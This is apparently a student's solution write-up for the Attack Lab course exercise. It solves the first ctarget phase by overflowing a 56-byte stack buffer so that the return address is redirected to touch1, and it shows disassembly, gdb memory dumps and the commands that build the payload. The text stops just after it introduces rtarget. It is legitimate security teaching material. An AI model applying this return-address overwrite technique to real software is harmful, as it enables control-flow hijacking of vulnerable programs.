# Solutions for Attack-Lab.


## Get Ready

### Disassemble Targets

~~~
objdump -d ctarget > dumps/ctarget.txt
~~~

~~~
objdump -d rtarget > dump/rtarget.txt
~~~

### Compile and Disassemble farm.c

~~~
gcc -c farm.c -Og
~~~

~~~
objdump -d farm.o > dumps/farm.txt
~~~


## Solve: ctarget

`ctarget` has some code-injection vulnerabilities.

It consists of three phases: touch1, touch2 and touch2.

We need to call them with right parameters by replacing return address stored in stack.

# Touch1

~~~
(gdb) call touch1
$2 = {void ()} 0x40195b <touch1>
~~~

Touch1 is at 0x40195b, takes no parameter and returns nothing.

We can call it in `test()`.

~~~
0000000000401b06 <test>:
  401b06:       48 83 ec 08             sub    $0x8,%rsp
  401b0a:       b8 00 00 00 00          mov    $0x0,%eax
  401b0f:       e8 31 fe ff ff          callq  401945 <getbuf>
  401b14:       89 c2                   mov    %eax,%edx
  401b16:       be 48 33 40 00          mov    $0x403348,%esi
  401b1b:       bf 01 00 00 00          mov    $0x1,%edi
  401b20:       b8 00 00 00 00          mov    $0x0,%eax
  401b25:       e8 d6 f2 ff ff          callq  400e00 <__printf_chk@plt>
  401b2a:       48 83 c4 08             add    $0x8,%rsp
  401b2e:       c3                      retq
~~~

It calls `getbuf()`.

~~~
0000000000401945 <getbuf>:
  401945:       48 83 ec 38             sub    $0x38,%rsp
  401949:       48 89 e7                mov    %rsp,%rdi
  40194c:       e8 7e 02 00 00          callq  401bcf <Gets>
  401951:       b8 01 00 00 00          mov    $0x1,%eax
  401956:       48 83 c4 38             add    $0x38,%rsp
  40195a:       c3                      retq
~~~

At 0x401949, stack looks like:

~~~
(gdb) x/32wx $rsp
0x55672c78:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672c88:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672c98:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672ca8:	0x55586000	0x00000000	0x00401b14	0x00000000
0x55672cb8:	0x00000002	0x00000000	0x004020ab	0x00000000
0x55672cc8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x55672cd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x55672ce8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
~~~

We see `0x00401b14`, which is the return address.

We want it to be `0x0040195b`, the address of `touch1()`.

There are 56 bytes of padding before the return address.

We can assume that the size of the buffer is 56.

It accepts only character, so we need to consider endian.

~~~
0x55672cb0:	0x14	0x1b	0x40	0x00	0x00	0x00	0x00	0x00
~~~

The address `0x00401b14` in little endian.

Therefore, `0x0040195b` shell be `0x5b 0x19 0x40`.

Now, generate the string:

[56 padding][0x5b 0x19 0x40 in ascii]


~~~
$ printf '0%.0s' {1..56} > injection/touch1.txt

$ ./h2r 5b 19 40 >> injection/touch1.txt
~~~

~~~
(gdb) run -q -i injection/touch1.txt
~~~

~~~
0x55672cb0:	0x5b	0x19	0x40	0x00	0x00	0x00	0x00	0x00
~~~

We got it.


## Solve: rtarget

`rtarget` has some return-oriented-programming vulnerabilities.
